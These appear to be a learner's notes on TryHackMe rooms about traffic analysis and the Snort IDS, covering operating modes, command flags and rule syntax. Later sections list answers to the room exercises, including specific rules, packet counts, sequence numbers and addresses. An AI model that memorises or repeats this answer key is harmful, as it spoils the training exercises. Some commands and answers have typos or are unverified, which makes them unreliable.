# Network Security and Traffic Analysis

## **--Traffic Analysis Essentials--**

### _**Introduction**_
Network Security is a set of operations for protecting data, applications, devices and systems connected to the network. It is accepted as one of the significant subdomains of cyber security. It focuses on the system design, operation and management of the architecture/infrastructure to provide network accessibility, integrity, continuity and reliability. Traffic analysis (often called Network Traffic Analysis) is a subdomain of the Network Security domain, and its primary focus is investigating the network data to identify problems and anomalies. 

This room will cover the foundations of Network Security and Traffic analysis and introduce the essential concepts of these disciplines to help you step into Traffic/Packet Analysis. We suggest completing the "[Network Fundamentals](https://tryhackme.com/module/network-fundamentals)" module before starting working in this room.

### _**Network Security and Network Data**_
Network Security  

The essential concern of Network Security focuses on two core concepts: authentication and authorisation. There are a variety of tools, technologies, and approaches to ensure and measure implementations of these two key concepts and go beyond to provide continuity and reliability. Network security operations contain three base control levels to ensure the maximum available security management.

Base Network Security Control Levels:
![](2022-12-14-07-25-31.png)

There are two main approaches and multiple elements under these control levels. The most common elements used in network security operations are explained below.

The main approaches:
![](2022-12-14-07-26-10.png)

The key elements of Access Control:
![](2022-12-14-07-26-54.png)

The key elements of Threat Control:
![](2022-12-14-07-27-44.png)

Typical Network Security Management Operation is explained in the given table:
![](2022-12-14-07-28-29.png)

Managed Security Services  

Not every organisation has enough resources to create dedicated groups for specific security domains. There are plenty of reasons for this: budget, employee skillset, and organisation size could determine how security operations are handled. At this point, Managed Security Services (MSS) come up to fulfil the required effort to ensure/enhance security needs. MSS are services that have been outsourced to service providers. These service providers are called Managed Security Service Providers (MSSPs). Today, most MSS are time and cost effective, can be conducted in-house or outsourced, are easy to engage, and ease the management process. There are various elements of MSS, and the most common ones are explained below.

![](2022-12-14-07-29-03.png)

### _**Traffic Analysis**_
Traffic Analysis / Network Traffic Analysis  

Traffic Analysis is a method of intercepting, recording/monitoring, and analysing network data and communication patterns to detect and respond to system health issues, network anomalies, and threats. The network is a rich data source, so traffic analysis is useful for security and operational matters. The operational issues cover system availability checks and measuring performance, and the security issues cover anomaly and suspicious activity detection on the network. 

Traffic analysis is one of the essential approaches used in network security, and it is part of multiple disciplines of network security operations listed below:

- Network Sniffing and Packet Analysis (Covered in [**Wireshark room**](https://tryhackme.com/room/wiresharkthebasics))
- Network Monitoring (Covered in [**Zeek room**](https://tryhackme.com/room/zeekbro))
- Intrusion Detection and Prevention (Covered in [**Snort room**](https://tryhackme.com/room/snort))  
    
- Network Forensics (Covered in [**NetworkMiner room**](https://tryhackme.com/room/networkminer))
- Threat Hunting (Covered in [**Brim room**](https://tryhackme.com/room/brim))

There are two main techniques used in Traffic Analysis:
![](2022-12-14-07-39-38.png)

Benefits of the Traffic Analysis:

- Provides full network visibility.
- Helps comprehensive baselining for asset tracking.
- Helps to detect/respond to anomalies and threats.

Does the Traffic Analysis Still Matter?  

The widespread usage of security tools/services and an increasing shift to cloud computing force attackers to modify their tactics and techniques to avoid detection. Network data is a pure and rich data source. Even if it is encoded/encrypted, it still provides a value by pointing to an odd, weird or unexpected pattern/situation. Therefore traffic analysis is still a must-to-have skill for any security analyst who wants to detect and respond to advanced threats.

Now you know what Traffic Analysis is and how it operates. Now use the static site to simulate a traffic analysis operation and find the flags.

## **--Snort--**

### _**Introduction**_
This room expects you to be familiar with basic Linux command-line functionalities like general system navigation and Network fundamentals (ports, protocols and traffic data). The room aims to encourage you to start working with Snort to analyse live and captured traffic.

Before joining this room, we suggest completing the ['Network Fundamentals'](https://tryhackme.com/module/network-fundamentals) module. If you have general knowledge of network basics and Linux fundamentals, you will be ready to begin! If you feel you need assistance in the Linux command line, you can always refer to our "Linux Fundamentals" rooms (here [1](https://tryhackme.com/room/linuxfundamentalspart1) [2](https://tryhackme.com/room/linuxfundamentalspart2) [3](https://tryhackme.com/room/linuxfundamentalspart3)); 

SNORT is an **open-source, rule-based** Network Intrusion Detection and Prevention System **(NIDS/NIPS)**. It was developed and still maintained by Martin Roesch, open-source contributors, and the Cisco Talos team. 

**[The official description](https://www.snort.org/):** *"__Snort is the foremost Open Source Intrusion Prevention System (IPS) in the world. Snort IPS uses a series of rules that help define malicious network activity and uses those rules to find packets that match against them and generate alerts for users.__"*

### _**Interactive Material and VM**_

### _**Introduction to IDS/IPS**_
Before diving into Snort and analysing traffic, let's have a brief overview of what an Intrusion Detection System (IDS) and Intrusion Prevention System (IPS) is. It is possible to configure your network infrastructure and use both of them, but before starting to use any of them, let's learn the differences.  
  
**Intrusion Detection System (IDS)**

IDS is a passive monitoring solution for detecting possible malicious activities/patterns, abnormal incidents, and policy violations. It is responsible for generating alerts for each suspicious event. 

There are two main types of IDS systems;

- Network Intrusion Detection System (NIDS) - NIDS monitors the traffic flow from various areas of the network. The aim is to investigate the traffic on the entire subnet. If a signature is identified, an alert is created.
- Host-based Intrusion Detection System (HIDS) - HIDS monitors the traffic flow from a single endpoint device. The aim is to investigate the traffic on a particular device. If a signature is identified, an alert is created.

  
Intrusion Prevention System (IPS)

IPS is an active protecting solution for preventing possible malicious activities/patterns, abnormal incidents, and policy violations. It is responsible for stopping/preventing/terminating the suspicious event as soon as the detection is performed.

 **There are four main types of IPS systems;**

- Network Intrusion Prevention System (NIPS) - NIPS monitors the traffic flow from various areas of the network. The aim is to protect the traffic on the entire subnet. If a signature is identified, the connection is terminated.
- Behaviour-based Intrusion Prevention System (Network Behaviour Analysis - NBA) - Behaviour-based systems monitor the traffic flow from various areas of the network. The aim is to protect the traffic on the entire subnet. If a signature is identified, **the connection is terminated.**

Network Behaviour Analysis System works similar to NIPS. The difference between NIPS and Behaviour-based is; behaviour based systems require a training period (also known as "baselining") to learn the normal traffic and differentiate the malicious traffic and threats. This model provides more efficient results against new threats.  

The system is trained to know the "normal" to detect "abnormal". The training period is crucial to avoid any false positives. In case of any security breach during the training period, the results will be highly problematic. Another critical point is to ensure that the system is well trained to recognise benign activities.   

- Wireless Intrusion Prevention System (WIPS) - WIPS monitors the traffic flow from of wireless network. The aim is to protect the wireless traffic and stop possible attacks launched from there. If a signature is identified, the connection is terminated.
- Host-based Intrusion Prevention System (HIPS) - HIPS actively protects the traffic flow from a single endpoint device. The aim is to investigate the traffic on a particular device. If a signature is identified, **the connection is terminated.**

HIPS working mechanism is similar to HIDS. The difference between them is that **while HIDS creates alerts for threats,** **HIPS stops the threats by terminating the connection.  
**

  
Detection/Prevention Techniques

There are three main detection and prevention techniques used in IDS and IPS solutions;
![](2022-12-14-08-37-40.png)

Summary  

**Phew!** That was a long ride and lots of information. Let's summarise the overall functions of the IDS and IPS in a nutshell.

- **IDS** can identify threats but require user assistance to stop them.
- **IPS** can identify and block the threats with less user assistance at the detection time.  
    

**Now let's talk about Snort. [Here is the rest of the official description](https://www.snort.org/) of the snort;**

_"__Snort can be deployed inline to stop these packets, as well. Snort has three primary uses: As a packet sniffer like tcpdump, as a packet logger — which is useful for network traffic debugging, or it can be used as a full-blown network intrusion prevention system. Snort can be downloaded and configured for personal and business use alike."_  

SNORT is an open-source, rule-based Network Intrusion Detection and Prevention System (NIDS/NIPS). It was developed and still maintained by Martin Roesch, open-source contributors, and the Cisco Talos team. 

Capabilities of Snort:
- Live traffic analysis
- Attack and probe detection
- Packet logging
- Protocol analysis
- Real-time alerting
- Modules & plugins
- Pre-processors
- Cross-platform support! (Linux & Windows)

Snort has three main use models:  
- Sniffer Mode - Read IP packets and prompt them in the console application.
- Packet Logger Mode - Log all IP packets (inbound and outbound) that visit the network.
- NIDS (Network Intrusion Detection System)  and NIPS (Network Intrusion Prevention System) Modes - Log/drop the packets that are deemed as malicious according to the user-defined rules.

### _**First Interaction with Snort**_
The First Interaction with Snort

First, let's verify snort is installed. The following command will show you the instance version.

`snort -V`

Before getting your hands dirty, we should ensure our configuration file is valid.  

Here **"-T"** is used for testing configuration, and **"-c"** is identifying the configuration file **(snort.conf)**.  
Note that it is possible to use an additional configuration file by pointing it with **"-c"**.

`sudo snort -c /etc/snort/snort.conf -T`

Once we use a configuration file, snort got much more power! The configuration file is an all-in-one management file of the snort. Rules, plugins, detection mechanisms, default actions and output settings are identified here. It is possible to have multiple configuration files for different purposes and cases but can only use one at runtime.  

Note that every time you start the Snort, it will automatically show the default banner and initial information about your setup. You can prevent this by using the "**\-q"** parameter.
![](2022-12-14-08-54-41.png)

### _**Operation Mode 1: Sniffer Mode**_
**Let's run Snort in Sniffer Mode**

Like tcpdump, Snort has various flags capable of viewing various data about the packet it is ingesting.  

Sniffer mode parameters are explained in the table below;
![](2022-12-14-08-56-03.png)

Let's start using each parameter and see the difference between them. Snort needs active traffic on your interface, so we need to generate traffic to see Snort in action.  

To do this, use **the traffic-generator** script (find this in the Task-Exercise folder)  

  
Sniffing with parameter "-i"  

Start the Snort instance in **verbose mode (-v)** and **use the interface (-i)** "eth0"; `sudo snort -v-i eth0`

In case you have only one interface, Snort uses it by default. The above example demonstrates to sniff on the interface named "eth0". Once you simulate the parameter -v, you will notice it will automatically use the "eth0" interface and prompt it.

**  
Sniffing with parameter "-v"**  

Start the Snort instance in **verbose mode (-v)**; `sudo snort -v`

Now run the traffic-generator script as sudo and start **ICMP/HTTP traffic**. Once the traffic is generated, snort will start showing the  packets in verbosity mode as follows;

As you can see in the given output, verbosity mode provides tcpdump like output information. Once we interrupt the sniffing with CTRL+C, it stops and summarises the sniffed packets.  

  
Sniffing with parameter "-d"  

Start the Snort instance in **dumping packet data mode (-d)**; `sudo snort -d`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start showing the  packets in verbosity mode as follows;

As you can see in the given output, packet data payload mode covers the verbose mode and provides more data.  

  
Sniffing with parameter "-de"  

Start the Snort instance in **dump (-d)** and **link-layer header grabbing (-e)** mode; `snort -d -e`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start showing the  packets in verbosity mode as follows;

Sniffing with parameter "-X"  

Start the Snort instance in **full packet dump mode (-X)**; `sudo snort -X`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start showing the  packets in verbosity mode as follows;

Note that you can use the parameters both in combined and separated form as follows;**

- snort -v
- snort -vd
- snort -de
- snort -v -d -e
- snort -X

Make sure you understand and practice each parameter with different types of traffic and discover your favourite combination.

### _**Operation Mode 2: Packet Logger Mode**_
Let's run Snort in Logger Mode  

You can use Snort as a sniffer and log the sniffed packets via logger mode. You only need to use the packet logger mode parameters, and Snort does the rest to accomplish this.

Packet logger parameters are explained in the table below;
![](2022-12-15-06-47-29.png)

Let's start using each parameter and see the difference between them. Snort needs active traffic on your interface, so we need to generate traffic to see Snort in action.  

**  
Logfile Ownership**

Before generating logs and investigating them, we must remember the Linux file ownership and permissions. No need to deep dive into user types and permissions. The fundamental file ownership rule; **whoever creates a file becomes the owner of the corresponding file**.  

Snort needs superuser (root) rights to sniff the traffic, so once you run the snort with the "sudo" command, the "root" account will own the generated log files. Therefore you will need "root" rights to investigate the log files. There are two different approaches to investigate the generated log files;  
  

- Elevation of privileges **-** You can elevate your privileges to examine the files. You can use the "sudo" command to execute your command as a superuser with the following command `sudo command`. You can also elevate the session privileges and switch to the superuser account to examine the generated log files with the following command: `sudo su`

- Changing the ownership of files/directories - You can also change the ownership of the file/folder to read it as your user: `sudo chown username file` or `sudo chown username -R directory` The "-R" parameter helps recursively process the files and directories.

  
Logging with parameter "-l"  

First, start the Snort instance in packet logger mode; `sudo snort -dev -l .`

Now start ICMP/HTTP traffic with the traffic-generator script.  

Once the traffic is generated, Snort will start showing the packets and log them in the target directory. You can configure the default output directory in snort.config file. However, you can use the "-l" parameter to set a target directory. Identifying the default log directory is useful for continuous monitoring operations, and the "-l" parameter is much more useful for testing purposes.

The `-l .` part of the command creates the logs in the current directory. You will need to use this option to have the logs for each exercise in their folder.

`sudo snort -dev -l .`

Now, let's check the generated log file. Note that the log file names will be different in your case.

`ls .`

As you can see, it is a single all-in-one log file. It is a binary/tcpdump format log. This is what it looks like in the folder view.

Logging with parameter "-K ASCII"  

Start the Snort instance in packet logger mode; `sudo snort -dev -K ASCII`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, Snort will start showing the  packets in verbosity mode as follows;

`sudo snort -dev -K ASCII -l .`

Now, let's check the generated log file.

`ls .`

The logs created with "-K ASCII" parameter is entirely different. There are two folders with IP address names. Let's look into them.

`ls ./<IP>`

Once we look closer at the created folders, we can see that the logs are in ASCII and categorised format, so it is possible to read them without using a Snort instance.

In a nutshell, ASCII mode provides multiple files in human-readable format, so it is possible to read the logs easily by using a text editor. By contrast with ASCII format, binary format is not human-readable and requires analysis using Snort or an application like tcpdump.

Let's compare the ASCII format with the binary format by opening both of them in a text editor. The difference between the binary log file and the ASCII log file is shown below. (Left side: binary format. Right side: ASCII format).
![](2022-12-15-06-51-24.png)

Reading generated logs with parameter "-r"  

Start the Snort instance in packet reader mode; `sudo snort -r`

`sudo snort -r snort.log.<number>`

**Note that** Snort can read and handle the binary like output (tcpdump and Wireshark also can handle this log format). However, if you create logs with "-K ASCII" parameter, Snort will not read them. As you can see in the above output, Snort read and displayed the log file just like in the sniffer mode.

Opening log file with tcpdump.

`sudo tcpdump -r snort.log.<number> -ntc 10`

"-r" parameter also allows users to filter the binary log files. **You can filter the processed log to see specific packets with the "-r" parameter and Berkeley Packet Filters (BPF).** 

- `sudo snort -r logname.log -X`
- `sudo snort -r logname.log icmp`
- `sudo snort -r logname.log tcp`
- `sudo snort -r logname.log 'udp and port 53'`

The output will be the same as the above, but only packets with the chosen protocol will be shown. Additionally, you can specify the number of processes with the parameter "-n". **The following command will process only the first 10 packets:** `snort -dvr logname.log -n 10`

Please use the following resources to understand how the BPF works and its use.  

- [https://en.wikipedia.org/wiki/Berkeley\_Packet\_Filter](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter)
- [https://biot.com/capstats/bpf.html](https://biot.com/capstats/bpf.html)
- [https://www.tcpdump.org/manpages/tcpdump.1.html](https://www.tcpdump.org/manpages/tcpdump.1.html)

### _**Operation Mode 3: IDS/IPS**_
Snort in IDS/IPS Mode

Capabilities of Snort are not limited to sniffing and logging the traffic. IDS/IPS mode helps you manage the traffic according to user-defined rules.

**Note that** (N)IDS/IPS mode depends on the rules and configuration. **TASK-10** summarises the essential paths, files and variables. Also, **TASK-3** covers configuration testing. Here, we need to understand the operating logic first, and then we will be going into rules in **TASK-9**.  

  
Let's run Snort in IDS/IPS Mode  

NIDS mode parameters are explained in the table below;
![](2022-12-15-07-26-43.png)

Let's start using each parameter and see the difference between them. Snort needs active traffic on your interface, so we need to generate traffic to see Snort in action. To do this, use the traffic-generator script and sniff the traffic. 

**Once you start running IDS/IPS mode,** you need to use rules. As we mentioned earlier, we will use a pre-defined ICMP rule as an example. The defined rule will only generate alerts in any direction of ICMP packet activity.

`alert icmp any any <> any any  (msg: "ICMP Packet Found"; sid: 100001; rev:1;)`  

This rule is located in "/etc/snort/rules/local.rules".  

Remember, in this module, we will focus only on the operating modes. The rules are covered in TASK9&10. **Snort will create an "alert" file if the traffic flow triggers an alert.** **One last note;** once you start running IPS/IDS mode, the sniffing and logging mode will be semi-passive. However, you can activate the functions using the parameters discussed in previous tasks. **(-i, -v, -d, -e, -X, -l, -K ASCII)** If you don't remember the purpose of these commands, please revisit TASK4.

  
IDS/IPS mode with parameter "-c and -T"  

Start the Snort instance and test the configuration file. `sudo snort -c /etc/snort/snort.conf -T` This command will check your configuration file and prompt it if there is any misconfiguratioın in your current setting. You should be familiar with this command if you covered TASK3. If you don't remember the output of this command, **please revisit TASK4**.

  
IDS/IPS mode with parameter "-N"

Start the Snort instance and disable logging by running the following command: `sudo snort -c /etc/snort/snort.conf -N`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. This command will disable logging mode. The rest of the other functions will still be available (if activated).

The command-line output will provide the information requested with the parameters. So, if you activate verbosity (-v) or full packet dump (-X) you will still have the output in the console, but there will be no logs in the log folder.  

  
IDS/IPS mode with parameter "-D"  

Start the Snort instance in background mode with the following command: `sudo snort -c /etc/snort/snort.conf -D`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start processing the packets and accomplish the given task with additional parameters.

The command-line output will provide the information requested with the parameters. So, if you activate **verbosity (-v)** or **full packet dump (-X)** with **packet logger mode (-l)** you will still have the logs in the logs folder, but there will be no output in the console.

Once you start the background mode and want to check the corresponding process, you can easily use the "ps" command as shown below;

`ps -ef | grep snort`

If you want to stop the daemon, you can easily use the "kill" command to stop the process.

`sudo kill -9 <process id>`

Note that daemon mode is mainly used to automate the Snort. This parameter is mainly used in scripts to start the Snort service in the background. It is not recommended to use this mode unless you have a working knowledge of Snort and stable configuration.  

  
_IDS/IPS mode with parameter "-A"_

**Remember that there are several alert modes available in snort;**  

- console: Provides fast style alerts on the console screen.
- cmg: Provides basic header details with payload in hex and text format.
- **full:** Full alert mode, providing all possible information about the alert.  
    
- **fast:** Fast mode, shows the alert message, timestamp, source and destination ıp along with port numbers.
- **none:** Disabling alerting.  
    

In this section, only the **"console"** and **"cmg"** parameters provide alert information in the console. It is impossible to identify the difference between the rest of the alert modes via terminal. Differences can be identified by looking at generated logs. 

At the end of this section, we will compare the "full", "fast" and "none" modes. Remember that these parameters don't provide console output, so we will continue to identify the differences through log formats.  

  
_IDS/IPS mode with parameter "-A console"_

Console mode provides fast style alerts on the console screen. Start the Snort instance in **console** alert mode (-A console ) with the following command `sudo snort -c /etc/snort/snort.conf -A console`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start generating alerts according to provided ruleset defined in the configuration file.

_IDS/IPS mode with parameter "-A cmg"_

Cmg mode provides basic header details with payload in hex and text format. Start the Snort instance in cmg alert mode (-A cmg ) with the following command `sudo snort -c /etc/snort/snort.conf -A cmg`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start generating alerts according to provided ruleset defined in the configuration file.

**Let's compare the console and cmg outputs** before moving on to other alarm types. As you can see in the given outputs above, **console mode** provides basic header and rule information. **Cmg mode** provides full packet details along with rule information. 

  
_IDS/IPS mode with parameter "-A fast"_

Fast mode provides alert messages, timestamps, and source and destination IP addresses. **Remember, there is no console output in this mode.** Start the Snort instance in fast alert mode (-A fast ) with the following command `sudo snort -c /etc/snort/snort.conf -A fast`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start generating alerts according to provided ruleset defined in the configuration file.

_IDS/IPS mode with parameter "-A full"_

Full alert mode provides all possible information about the alert. **Remember, there is no console output in this mode.** Start the Snort instance in full alert mode (-A full ) with the following command `sudo snort -c /etc/snort/snort.conf -A full`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start generating alerts according to provided ruleset defined in the configuration file.

_IDS/IPS mode with parameter "-A none"_

Disable alerting. This mode doesn't create the alert file. However, it still logs the traffic and creates a log file in binary dump format. Remember, there is no console output in this mode. Start the Snort instance in none alert mode (-A none) with the following command `sudo snort -c /etc/snort/snort.conf -A none`

Now run the traffic-generator script as sudo and start ICMP/HTTP traffic. Once the traffic is generated, snort will start generating alerts according to provided ruleset defined in the configuration file.

_IDS/IPS mode: "Using rule file without configuration file"_

It is possible to run the Snort only with rules without a configuration file. Running the Snort in this mode will help you test the user-created rules. However, this mode will provide less performance.

`sudo snort -c /etc/snort/rules/local.rules -A console`

_IPS mode and dropping packets_

Snort IPS mode activated with \-Q --daq afpacket parameters. You can also activate this mode by editing snort.conf file. However, you don't need to edit snort.conf file in the scope of this room. Review the bonus task or snort manual for further information on daq and advanced configuration settings: `-Q --daq afpacket`

Activate the Data Acquisition (DAQ) modules and use the afpacket module to use snort as an IPS: `-i eth0:eth1`

Identifying interfaces note that Snort IPS require at least two interfaces to work. Now run the traffic-generator script as sudo and start ICMP/HTTP traffic.

`sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A console`

### _**Operation Mode 4: PCAP Investigation**_
Let's investigate PCAPs with Snort

Capabilities of Snort are not limited to sniffing, logging and detecting/preventing the threats. PCAP read/investigate mode helps you work with pcap files. Once you have a pcap file and process it with Snort, you will receive default traffic statistics with alerts depending on your ruleset.

Reading a pcap without using any additional parameters we discussed before will only overview the packets and provide statistics about the file. In most cases, this is not very handy. We are investigating the pcap with Snort to benefit from the rules and speed up our investigation process by using the known patterns of threats. 

Note that we are pretty close to starting to create rules. Therefore, you need to grasp the working mechanism of the Snort, learn the discussed parameters and begin combining the parameters for different purposes.

PCAP mode parameters are explained in the table below;
![](2022-12-16-07-15-37.png)

_Investigating single PCAP with parameter "-r"_

For test purposes, you can still test the default reading option with pcap by using the following command `snort -r icmp-test.pcap`

Let's investigate the pcap with our configuration file and see what will happen. `sudo snort -c /etc/snort/snort.conf -q -r icmp-test.pcap -A console -n 10`

If you don't remember the purpose of the parameters in the given command, please revisit previous tasks and come back again!

_Investigating multiple PCAPs with parameter "--pcap-list"_  

Let's investigate multiple pcaps with our configuration file and see what will happen. `sudo snort -c /etc/snort/snort.conf -q --pcap-list="icmp-test.pcap http2.pcap" -A console -n 10`

_Investigating multiple PCAPs with parameter "--pcap-show"_  

Let's investigate multiple pcaps, distinguish each one, and see what will happen. `sudo snort -c /etc/snort/snort.conf -q --pcap-list="icmp-test.pcap http2.pcap" -A console --pcap-show`

Investigate the **mx-1.pcap** file with the default configuration file.  

`sudo snort -c /etc/snort/snort.conf -A full -l . -r mx-1.pcap`

Investigate the mx-1.pcap file **with the second** configuration file.  

`sudo snort -c /etc/snort/snortv2.conf -A full -l . -r mx-1.pcap`

Investigate the **mx-2.pcap** file with the default configuration file.  

`sudo snort -c /etc/snort/snort.conf -A full -l . -r mx-2.pcap`

Investigate the mx-2.pcap and mx-3.pcap files with the default configuration file.  

`sudo snort -c /etc/snort/snort.conf -A full -l . --pcap-list="mx-2.pcap mx-3.pcap"`

### _**Snort Rule Structure**_
**Let's Learn Snort Rules!**

Understanding the Snort rule format is essential for any blue and purple teamer.  The primary structure of the snort rule is shown below;
![](2022-12-16-07-29-18.png)
- The following rule will generate an alert for each ICMP packet processed by Snort;
![](2022-12-16-07-30-20.png)

Each rule should have a type of action, protocol, source and destination IP, source and destination port and an option. Remember, Snort is in passive mode by default. So most of the time, you will use Snort as an IDS. You will need to start **"inline mode" to turn on IPS mode.** But before you start playing with inline mode, you should be familiar with Snort features and rules.  

The Snort rule structure is easy to understand but difficult to produce. You should be familiar with rule options and related details to create efficient rules. It is recommended to practice Snort rules and option details for different use cases.

We will cover the basic rule structure in this room and help you take a step into snort rules. You can always advance your rule creation skills with different rule options by practising different use cases and studying rule option details in depth. We will focus on two actions; **"alert"** for IDS mode and **"reject"** for IPS mode.

Rules cannot be processed without a header. Rule options are "optional" parts. However, it is almost impossible to detect sophisticated attacks without using the rule options.
![](2022-12-16-07-31-09.png)

**IP and Port Numbers**

These parameters identify the source and destination IP addresses and associated port numbers filtered for the rule.
![](2022-12-16-07-32-06.png)

Direction

The direction operator indicates the traffic flow to be filtered by Snort. The left side of the rule shows the source, and the right side shows the destination.

- **\->** Source to destination flow.
- **<>** Bidirectional flow

Note that there is no "<-" operator in Snort.
![](2022-12-16-07-32-55.png)

There are three main rule options in Snort;  

- General Rule Options - Fundamental rule options for Snort. 
- Payload Rule Options - Rule options that help to investigate the payload data. These options are helpful to detect specific payload patterns.
- Non-Payload Rule Options - Rule options that focus on non-payload data. These options will help create specific patterns and identify network issues.

**General Rule Options**

![](2022-12-16-07-34-02.png)

**Payload Detection Rule Options**

![](2022-12-16-07-34-36.png)

**Non-Payload Detection Rule Options**

There are rule options that focus on non-payload data. These options will help create specific patterns and identify network issues.

![](2022-12-16-07-35-31.png)

Remember, once you create a rule, it is a local rule and should be in your "local.rules" file. This file is located under "/etc/snort/rules/local.rules". A quick reminder on how to edit your local rules is shown below.

`sudo gedit /etc/snort/rules/local.rules`

Note that there are some default rules activated with snort instance. These rules are deactivated to manage your rules and improve your exercise experience. For further information, please refer to the TASK-10 or [Snort manual](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/).  

By this point, we covered the primary structure of the Snort rules. Understanding and practicing the fundamentals is suggested before creating advanced rules and using additional options.

Wow! We have covered the fundamentals of the Snort rules! Now, use the attached VM and navigate to the Task-Exercises/Exercise-Files/TASK-9 folder to answer the questions! Note that you can use the following command to create the logs in the **current directory: `-l .`**

Write a rule to filter **IP ID "35369"** and run it against the given pcap file. What is the request name of the detected packet? `snort -c local.rules -A full -l . -r task9.pcap`
- `alert ip any any <> any any (msg: "IP Packet found";id:35369; sid:1000001; rev:1;)`
- `cat alert`
- TIMESTAMP REQUEST

Create a rule to filter packets with Syn flag and run it against the given pcap file. What is the number of detected packets?
- `alert tcp any any -> any any (msg: "Flags Found"; flags:S; sid:1000001; rev:1;)`
- 1

Clear the previous log and alarm files and deactivate/comment out the old rule.

Write a rule to filter packets with Push-Ack flags and run it against the given pcap file. What is the number of detected packets?
- `alert tcp any any -> any any (msg: "Flags Found"; flags:PA; sid:1000001; rev:1;)`
- 216

Clear the previous log and alarm files and deactivate/comment out the old rule.

Create a rule to filter packets with the same source and destination IP and run it against the given pcap file. What is the number of detected packets?
- `alert ip any any -> any any (msg: "Same IP Found"; sameip; sid:1000001; rev:1;)` This one didn't work added the next 2 for the correct answer
- `alert tcp any any -> any any (msg: "Same IP Found"; sameip; sid:1000001; rev:1;)`
- `alert udp any any -> any any (msg: "Same IP Found"; sameip; sid:1000002; rev:1;)`
- 10

Case Example - An analyst modified an existing rule successfully. Which rule option must the analyst change after the implementation?
- rev

### _**Snort2 Operation Logic: Points to Remember**_
**P**oints to Remember

**Main** Components of Snort

- **Packet Decoder -** Packet collector component of Snort. It collects and prepares the packets for pre-processing. 
- **Pre-processors -** A component that arranges and modifies the packets for the detection engine.
- **Detection Engine -** The primary component that process, dissect and analyse the packets by applying the rules. 
- Logging and Alerting - Log and alert generation component.
- Outputs and Plugins - Output integration modules (i.e. alerts to syslog/mysql) and additional plugin (rule management detection plugins) support is done with this component. 

**There are three types of rules available for snort**

- Community Rules - Free ruleset under the GPLv2. Publicly accessible, no need for registration.
- Registered Rules - Free ruleset (requires registration). This ruleset contains subscriber rules with 30 days delay.
- Subscriber Rules (Paid) - Paid ruleset (requires subscription). This ruleset is the main ruleset and is updated twice a week (Tuesdays and Thursdays).

You can download and read more on the rules [here](https://www.snort.org/downloads).

**Note:** Once you install Snort2, it automatically creates the required directories and files. However, if you want to use the community or the paid rules, you need to indicate each rule in the snort.conf file.

Since it is a long, all-in-one configuration file, editing it without causing misconfiguration is troublesome for some users. **That is why Snort has several rule updating modules and integration tools.** To sum up, never replace your configured Snort configuration files; you must edit your configuration files manually or update your rules with additional tools and modules to not face any fail/crash or lack of feature.

- snort.conf: _Main configuration file._
- local.rules: _User-generated rules file._

**Let's start with overviewing the main configuration file (snort.conf)** `sudo gedit /etc/snort/snort.conf`

**Navigate to the "Step #1: Set the network variables." section.**

This section manages the scope of the detection and rule paths.
![](2022-12-19-07-21-44.png)

**Navigate to the "Step #2: Configure the decoder." section.**  

In this section, you manage the IPS mode of snort. The single-node installation model IPS model works best with "afpacket" mode. You can enable this mode and run Snort in IPS.
![](2022-12-19-07-22-29.png)

Data Acquisition Modules (DAQ) are specific libraries used for packet I/O, bringing flexibility to process packets. It is possible to select DAQ type and mode for different purposes.

There are six DAQ modules available in Snort;

- **Pcap:** Default mode, known as Sniffer mode.
- **Afpacket:** Inline mode, known as IPS mode.
- **Ipq:** Inline mode on Linux by using Netfilter. It replaces the snort\_inline patch. 
- **Nfq:** Inline mode on Linux.
- **Ipfw:** Inline on OpenBSD and FreeBSD by using divert sockets, with the pf and ipfw firewalls.  
    
- **Dump:** Testing mode of inline and normalisation.

The most popular modes are the default (pcap) and inline/IPS (Afpacket).

**Navigate to the "Step #6: Configure output plugins" section.**

This section manages the outputs of the IDS/IPS actions, such as logging and alerting format details. The default action prompts everything in the console application, so configuring this part will help you use the Snort more efficiently. 

**Navigate to the "Step #7: Customise your ruleset" section.**
![](2022-12-19-07-23-03.png)

Note that "#" is commenting operator. You should uncomment a line to activate it.

### _**Conclusion**_
Complete the snort challenge room: [Snort Challenge - Live Attacks](https://tryhackme.com/room/snortchallenges1)

## **--Snort Challenge - The Basics--**
### _**Introduction**_

### _**Writing IDS Rules (HTTP)**_
Write rules to detect "all TCP port 80 traffic" packets in the given pcap file. 

`sudo tcpdump -n -r mx-3.pcap 'tcp port 80' | wc -l`
- not used, just a test

`alert tcp any any <> any 80 (msg: "TCP 80 Found"; ; sid:1000001; rev:1;)`
- added this to local.rules

`alert tcp any 80 <> any any (msg: "TCP 80 Found"; ; sid:1000002; rev:1;)`
- added this to local.rules 

`sudo snort -c ./local.rules -dev -l . -r ./mx-3.pcap`
- used this to run sort

What is the number of detected packets?
- 328

**Investigate the log file.**

What is the destination address of packet 63?

`snort -r snort.log.<number> -n 63`
- 145.254.160.237

What is the ACK number of packet 64?

`snort -r snort.log.<number> -n 64`
- 0x38AFFFF3

What is the SEQ number of packet 62?

`snort -r snort.log.<number> -n 62`
- 0x38AFFFF3

What is the TTL of packet 65?

`snort -r snort.log.<number> -n 65`
- 128

What is the source IP of packet 65?
- 145.254.160.237

What is the source port of packet 65?
- 3372

### _**Writing IDS Rules (FTP)**_
Write rules to detect "all TCP port 21"  traffic in the given pcap.

`alert tcp any any <> any 21 (msg: "TCP 21 found"; ; sid:1000001; rev:1;)`

`alert tcp any 21 <> any any (msg: "TCP 21 found"; ; sid:1000002; rev:1;)`

`sudo snort -c ./local.rules -dev -l . -r ./ftp-png-gif.pcap`

What is the number of detected packets?
- 614

Investigate the log file.

`sudo snort -r snort.log<number> -d "tcp and port 21" -n 10`

What is the FTP service name?
- Microsoft FTP service

